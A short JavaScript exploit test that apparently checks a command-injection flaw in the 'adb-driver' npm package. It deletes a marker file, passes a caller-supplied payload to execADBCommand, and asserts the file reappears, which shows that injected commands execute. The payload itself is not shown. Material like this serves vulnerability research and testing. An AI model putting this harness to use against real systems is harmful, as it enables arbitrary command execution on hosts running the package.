function exploitFunction(payload) {
  const root = require("adb-driver");
  const fs = require("fs");
  const path = "./adb-driver";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root.execADBCommand(payload).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
}

module.exports = { exploitFunction };